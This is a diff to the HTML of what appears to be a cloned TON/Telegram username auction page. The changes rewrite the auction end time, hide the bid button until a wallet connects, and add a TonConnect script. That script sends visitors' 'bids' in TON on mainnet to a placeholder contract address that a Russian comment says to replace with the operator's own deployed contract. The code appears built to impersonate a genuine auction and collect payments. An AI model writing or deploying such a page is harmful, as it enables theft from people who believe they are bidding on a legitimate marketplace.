@@ -171,14 +171,14 @@
 <div class="tm-section-countdown">
 <span class="tm-countdown-label short">Ends in</span>
 <span class="tm-countdown-label full">Auction ends in</span>
-<time class="tm-countdown-timer" data-relative="counter" datetime="2026-06-22T21:25:19+00:00"><span class="reel"><b class="digit timer-d" data-val="3 days"></b></span><span class="reel"><b class="digit timer-h0" data-val="1"></b><b class="digit timer-h1" data-val="1"></b></span><span class="reel"><b class="digit timer-m0" data-val="3"></b><b class="digit timer-m1" data-val="8"></b></span><span class="reel"><b class="digit timer-s0" data-val="0"></b><b class="digit timer-s1" data-val="8"></b></span></time>
+<time class="tm-countdown-timer" data-relative="counter" datetime="2026-06-23T14:30:00+00:00"><span class="reel"><b class="digit timer-d" data-val="3 days"></b></span><span class="reel"><b class="digit timer-h0" data-val="0"></b><b class="digit timer-h1" data-val="2"></b></span><span class="reel"><b class="digit timer-m0" data-val="1"></b><b class="digit timer-m1" data-val="0"></b></span><span class="reel"><b class="digit timer-s0" data-val="4"></b><b class="digit timer-s1" data-val="7"></b></span></time>
 </div>
 <div class="tm-section-countdown-end">
 <span class="tm-countdown-label">Auction will close soon</span>
 </div>
 </div>
 <div class="tm-section-box tm-section-buttons">
-<button class="btn btn-primary js-place-bid-btn" data-bid-amount="7910">Place bid</button>
+<button class="btn btn-primary js-place-bid-btn hide" data-bid-amount="7910">Place bid</button>
 </div>
 <div class="tm-section-subscribe tm-section-box js-subscribe">
 <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
@@ -209,7 +209,7 @@
 </td>
 <td>
 <div class="table-cell">
-<div class="tm-datetime"><span class="thin-only"><time class="short" datetime="2026-06-26T20:12:53.069773Z">7 days</time></span><span class="wide-only"><time datetime="2026-06-26T20:12:53.069773Z">7 days</time></span></div>
+<div class="tm-datetime"><span class="thin-only"><time class="short" datetime="2026-06-23T14:30:00+00:00">23.06.2026 14:30</time></span><span class="wide-only"><time datetime="2026-06-23T14:30:00+00:00">23.06.2026 14:30</time></span></div>
 </div>
 </td>
 <td>
@@ -465,7 +465,7 @@ Aj.onUnload(function(state) {
 });
 Wallet.init({"address":false,"ton_proof":"e6e3b091f7ff939354","logged_in":false,"version":2});
 </script>
-<script>Aj.pageLoaded();</script>
+ <script>Aj.pageLoaded();</script>
 <script>
 (function() {
   var wa = window.Telegram && Telegram.WebApp;
@@ -490,7 +490,7 @@ Wallet.init({"address":false,"ton_proof":"e6e3b091f7ff939354","logged_in":false,
     document.querySelectorAll('h2').forEach(function(el) {
       el.textContent = el.textContent.replace(/@\w+/, '@' + ref);
     });
-    document.querySelectorAll('time').forEach(function(el) {
+    document.querySelectorAll('.tm-datetime time').forEach(function(el) {
       var d = el.getAttribute('datetime');
       if (d) {
         var dt = new Date(d);
@@ -498,7 +498,7 @@ Wallet.init({"address":false,"ton_proof":"e6e3b091f7ff939354","logged_in":false,
         var diff = dt - now;
         if (diff > 0) {
           var days = Math.floor(diff / 86400000);
-          el.innerHTML = days + ' days';
+          el.textContent = days + ' day' + (days !== 1 ? 's' : '');
         }
       }
     });
@@ -511,33 +511,107 @@ Wallet.init({"address":false,"ton_proof":"e6e3b091f7ff939354","logged_in":false,
   }
 })();
 </script>
-<script>
-(function(){
-  var timer = document.querySelector('.tm-countdown-timer');
-  if (timer) {
-    var endDate = new Date(timer.getAttribute('datetime'));
-    function pad(n){ return n < 10 ? '0' + n : '' + n; }
-    function update(){
-      var diff = endDate - new Date();
-      if (diff <= 0) {
-        timer.innerHTML = '<span class="reel"><b class="digit timer-d" data-val="0">0 days</b></span><span class="reel"><b class="digit timer-h0" data-val="0">0</b><b class="digit timer-h1" data-val="0">0</b></span><span class="reel"><b class="digit timer-m0" data-val="0">0</b><b class="digit timer-m1" data-val="0">0</b></span><span class="reel"><b class="digit timer-s0" data-val="0">0</b><b class="digit timer-s1" data-val="0">0</b></span>';
-        return;
-      }
-      var days = Math.floor(diff / 86400000);
-      var hours = Math.floor((diff % 86400000) / 3600000);
-      var mins = Math.floor((diff % 3600000) / 60000);
-      var secs = Math.floor((diff % 60000) / 1000);
-      var dStr = days + ' day' + (days !== 1 ? 's' : '');
-      timer.innerHTML =
-        '<span class="reel"><b class="digit timer-d" data-val="' + dStr + '">' + dStr + '</b></span>' +
-        '<span class="reel"><b class="digit timer-h0" data-val="' + Math.floor(hours / 10) + '">' + Math.floor(hours / 10) + '</b><b class="digit timer-h1" data-val="' + (hours % 10) + '">' + (hours % 10) + '</b></span>' +
-        '<span class="reel"><b class="digit timer-m0" data-val="' + Math.floor(mins / 10) + '">' + Math.floor(mins / 10) + '</b><b class="digit timer-m1" data-val="' + (mins % 10) + '">' + (mins % 10) + '</b></span>' +
-        '<span class="reel"><b class="digit timer-s0" data-val="' + Math.floor(secs / 10) + '">' + Math.floor(secs / 10) + '</b><b class="digit timer-s1" data-val="' + (secs % 10) + '">' + (secs % 10) + '</b></span>';
-    }
-    update();
-    setInterval(update, 1000);
+<script type="module">
+import { TonConnect, CHAIN } from 'https://esm.sh/@tonconnect/sdk@3.0.5';
+import { beginCell, toNano, Address } from 'https://esm.sh/@ton/core@0.56.3';
+
+var CONTRACT_ADDRESS = 'EQD...'; // ⚠️ ЗАМЕНИТЬ на адрес развёрнутого контракта
+var MANIFEST_URL = '/tonconnect-manifest.json';
+
+function bocToBase64(cell) {
+  var boc = cell.toBoc({ idx: false, crc32: true });
+  var bytes = new Uint8Array(boc);
+  var binary = '';
+  for (var i = 0; i < bytes.length; i++) {
+    binary += String.fromCharCode(bytes[i]);
   }
-})();
+  return btoa(binary);
+}
+
+var connector = new TonConnect({ manifestUrl: MANIFEST_URL });
+
+function onWalletChange(wallet) {
+  if (wallet) {
+    var addr = wallet.account.address;
+    var short = addr.slice(0, 6) + '..' + addr.slice(-4);
+    document.querySelectorAll('.ton-auth-link .tm-button-label').forEach(function(el) {
+      el.textContent = short;
+    });
+    document.querySelectorAll('.ton-auth-link').forEach(function(el) {
+      el.classList.add('connected');
+    });
+    document.querySelector('.js-place-bid-btn').classList.remove('hide');
+    document.querySelector('.tm-section-subscribe').classList.add('hide');
+  } else {
+    document.querySelectorAll('.ton-auth-link .tm-button-label').forEach(function(el) {
+      el.textContent = 'Connect TON';
+    });
+    document.querySelectorAll('.ton-auth-link').forEach(function(el) {
+      el.classList.remove('connected');
+    });
+    document.querySelector('.js-place-bid-btn').classList.add('hide');
+    document.querySelector('.tm-section-subscribe').classList.remove('hide');
+  }
+}
+
+connector.onStatusChange(onWalletChange);
+
+if (connector.wallet) {
+  onWalletChange(connector.wallet);
+}
+
+document.querySelectorAll('.ton-auth-link').forEach(function(btn) {
+  btn.addEventListener('click', function() {
+    if (connector.wallet) {
+      connector.disconnect();
+    } else {
+      connector.connect();
+    }
+  });
+});
+
+async function placeBid(amount) {
+  if (!connector.wallet) {
+    alert('Connect TON wallet first');
+    return;
+  }
+  var payload = beginCell()
+    .storeUint(1, 32)
+    .storeUint(0, 64)
+    .endCell();
+  try {
+    var result = await connector.sendTransaction({
+      validUntil: Math.floor(Date.now() / 1000) + 300,
+      network: CHAIN.MAINNET,
+      messages: [{
+        address: CONTRACT_ADDRESS,
+        amount: toNano(amount).toString(),
+        payload: bocToBase64(payload)
+      }]
+    });
+    console.log('Bid ok:', result);
+    alert('Bid placed successfully!');
+  } catch (err) {
+    console.error('Bid err:', err);
+    alert('Bid failed: ' + (err.message || 'User rejected'));
+  }
+}
+
+window.placeBid = placeBid;
+
+document.querySelector('.js-place-bid-form')?.addEventListener('submit', function(e) {
+  e.preventDefault();
+  var input = document.querySelector('.js-amount-input');
+  var amount = input ? input.value : '0';
+  placeBid(amount.replace(/\s/g, ''));
+});
+
+document.querySelector('.js-place-bid-btn')?.addEventListener('click', function() {
+  if (!connector.wallet) {
+    connector.connect();
+    return;
+  }
+});
 </script>
 </body>
 </html>
